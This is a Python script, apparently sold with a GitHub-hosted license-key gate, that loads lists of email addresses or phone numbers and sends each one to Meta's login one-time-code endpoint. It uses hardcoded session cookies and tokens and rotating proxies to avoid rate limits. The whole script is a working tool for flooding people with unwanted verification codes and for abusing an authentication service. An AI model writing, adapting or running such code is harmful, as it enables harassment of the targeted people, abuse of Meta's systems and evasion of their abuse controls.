import requests
import time
import sys
import re
from colorama import Fore, Back, Style, init

# Initialize Colorama for styling
init(autoreset=True)

# =============================================================
#                   CONFIGURATION & BANNER
# =============================================================
DEVELOPER_NAME = "Hasan Mahmud"
WHATSAPP_NUMBER = "01650084668"

# ⚠️ আপনার GitHub এর Raw keys.txt ফাইলের লিংকটি এখানে বসান
GITHUB_KEY_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/keys.txt"

def show_banner():
    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    print(Fore.GREEN + Style.BRIGHT + f"       TOOL DEVELOPER: {DEVELOPER_NAME}       ")
    print(Fore.YELLOW + f"       WhatsApp: {WHATSAPP_NUMBER}       ")
    print(Fore.CYAN + Style.BRIGHT + "=" * 60 + "\n")

# =============================================================
#            GITHUB KEY VALIDATION SYSTEM (LICENSE)
# =============================================================
def validate_license():
    show_banner()
    print(Fore.BLUE + "[*] Checking license security with GitHub...")
    try:
        response = requests.get(GITHUB_KEY_URL, timeout=10)
        if response.status_code == 200:
            # Get list of valid keys from github, stripping whitespaces
            valid_keys = [key.strip() for key in response.text.split("\n") if key.strip()]
            
            user_key = input(Fore.WHITE + "Enter Your Access Key: ").strip()
            
            if user_key in valid_keys:
                print(Fore.GREEN + "\n[+] Access Granted! Welcome to the tool.")
                time.sleep(1.5)
                return True
            else:
                print(Fore.RED + "\n[!] Invalid Key! Contact Hasan Mahmud on WhatsApp.")
                sys.exit()
        else:
            print(Fore.RED + "[!] Failed to fetch database from GitHub. Status Code:", response.status_code)
            sys.exit()
    except Exception as e:
        print(Fore.RED + f"[!] Security Check Error: {e}")
        sys.exit()

# =============================================================
#               NETWORK & COUNTRY TRACKING
# =============================================================
def check_network_info():
    print(Fore.BLUE + "[*] Fetching network and geographic details...")
    try:
        # Request to IP-API to fetch live network details
        res = requests.get("http://ip-api.com/json/", timeout=10).json()
        if res.get("status") == "success":
            country = res.get("country", "Unknown")
            isp = res.get("isp", "Unknown")
            ip = res.get("query", "Unknown")
            current_date = time.strftime("%Y-%m-%d %H:%M:%S")
            
            print(Fore.CYAN + f"[#] Date/Time : {current_date}")
            print(Fore.CYAN + f"[#] Country   : {country}")
            print(Fore.CYAN + f"[#] Network/ISP: {isp}")
            print(Fore.CYAN + f"[#] IP Address: {ip}")
        else:
            print(Fore.YELLOW + "[-] Could not track network metadata.")
    except Exception:
        print(Fore.YELLOW + "[-] Network tracking offline.")
    print(Fore.CYAN + "=" * 60 + "\n")

# =============================================================
#                3-OPTION PROXY CONFIGURATION
# =============================================================
def setup_proxy():
    print(Fore.YELLOW + "=== PROXY SELECTION ===")
    print(Fore.WHITE + "[1] No Proxy (Direct Connection)")
    print(Fore.WHITE + "[2] Custom Single Proxy (Manual Input)")
    print(Fore.WHITE + "[3] Rotation Proxy List (Reads from proxies.txt)")
    
    proxy_choice = input(Fore.WHITE + "Select proxy option (1-3): ").strip()
    
    if proxy_choice == "1":
        return None, False
    elif proxy_choice == "2":
        proxy_ip = input(Fore.WHITE + "Enter proxy (e.g. host:port or user:pass@host:port): ").strip()
        proxies = {
            "http": f"http://{proxy_ip}",
            "https": f"http://{proxy_ip}"
        }
        return proxies, False
    elif proxy_choice == "3":
        try:
            with open("proxies.txt", "r") as file:
                proxy_list = [line.strip() for line in file if line.strip()]
            if not proxy_list:
                print(Fore.RED + "[!] proxies.txt is empty! Defaulting to No Proxy.")
                return None, False
            print(Fore.GREEN + f"[+] Loaded {len(proxy_list)} proxies for auto-rotation.")
            return proxy_list, True # Returns list and enables rotation flag
        except FileNotFoundError:
            print(Fore.RED + "[!] proxies.txt not found! Defaulting to No Proxy.")
            return None, False
    else:
        print(Fore.YELLOW + "[-] Invalid choice. Defaulting to No Proxy.")
        return None, False

# =============================================================
#                   PHONE FORMATTING LOGIC
# =============================================================
def format_global_phone(phone, default_prefix="+88"):
    cleaned = re.sub(r'[\s\-\(\)\.]', '', phone)
    if cleaned.startswith('+'):
        return cleaned
    if cleaned.startswith('00'):
        return f"+{cleaned[2:]}"
    return f"{default_prefix}{cleaned}"

# =============================================================
#                         MAIN RUNNER
# =============================================================
def main():
    # 1. Run Security License Check
    validate_license()
    
    # 2. Track and Display Network Info
    check_network_info()
    
    # 3. Setup Proxy System
    proxy_data, is_rotation = setup_proxy()
    
    url = "https://auth.meta.com/api/login-email-otp/send-nonce/"
    headers = {
      'User-Agent': "Mozilla/5.0 (Linux; Android 13; itel S667LN Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7827.91 Mobile Safari/537.36",
      'Accept-Encoding': "gzip, deflate, br, zstd",
      'origin': "https://auth.meta.com",
      'referer': "https://auth.meta.com/?waterfall_id=d7d21e1c-3b24-4e66-9518-419e434eab27",
      'Cookie': "datr=VStEaqDEO3LJX7KbgNMA7nQK; ps_l=1; ps_n=1"
    }

    print(Fore.YELLOW + "\n=== TARGET TYPE ===")
    print(Fore.WHITE + "[1] Process Emails (Gmail.txt)")
    print(Fore.WHITE + "[2] Process Phone Numbers (Phone.txt)")
    
    choice = input(Fore.WHITE + "Choose target option (1 or 2): ").strip()
    filename = "Gmail.txt" if choice == "1" else "Phone.txt" if choice == "2" else ""
    is_phone_mode = (choice == "2")
    
    if not filename:
        print(Fore.RED + "[!] Invalid Target Mode. Exiting.")
        sys.exit()

    try:
        with open(filename, "r") as file:
            data_list = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] Error: '{filename}' not found!")
        sys.exit()

    total_items = len(data_list)
    print(Fore.GREEN + f"[+] Total {total_items} entries loaded. Processing requests...\n")

    proxy_index = 0
    for index, item in enumerate(data_list, start=1):
        target = format_global_phone(item) if is_phone_mode else item
        print(Fore.MAGENTA + f"[{index}/{total_items}] Targeting: {target}")
        
        payload = {
          'contact_point': target,
          'qpl_join_id': "f99fecd91d184d0dd",
          'source_app_id': "1522763855472543",
          'waterfall_id': "d7d21e1c-3b24-4e66-9518-419e434eab27",
          'use_fb_cp_nonce': "false",
          'use_ig_cp_nonce': "false",
          'lsd': "AdRMN2xpWye8YqY73lypTFA3h38"
        }

        # Select current proxy configuration
        current_proxies = None
        if proxy_data:
            if is_rotation:
                # Rotate sequentially from list
                current_proxy_ip = proxy_data[proxy_index % len(proxy_data)]
                current_proxies = {"http": f"http://{current_proxy_ip}", "https": f"http://{current_proxy_ip}"}
                print(Fore.BLUE + f"[*] Using Proxy Rotation: {current_proxy_ip}")
                proxy_index += 1
            else:
                current_proxies = proxy_data

        try:
            response = requests.post(url, data=payload, headers=headers, proxies=current_proxies, timeout=12)
            if response.status_code == 200:
                print(Fore.GREEN + f"[+] Status: {response.status_code} (Sent Successfully)")
            else:
                print(Fore.YELLOW + f"[-] Status: {response.status_code} (Check Session Parameter)")
        except Exception as e:
            print(Fore.RED + f"[!] Network Error for {target}: {e}")
        
        print(Fore.WHITE + "-" * 50)
        time.sleep(4)

if __name__ == "__main__":
    main()
